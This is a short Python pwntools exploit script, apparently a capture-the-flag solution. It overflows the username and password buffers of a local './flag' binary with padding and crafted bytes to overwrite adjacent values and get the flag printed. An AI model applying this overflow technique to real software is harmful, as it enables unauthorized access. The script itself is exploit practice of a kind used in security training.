from pwn import *
pname = './flag'
p = process(pname)
username = 'charly'
password = 'h4ckTH1s'
print p.recvuntil('User : ')
p.send(username.ljust(0x10,"A")+"\x11")
print p.recvuntil('Password : ')
p.send(password.ljust(0x10,"B")+p64(0x1))
print p.recvall()
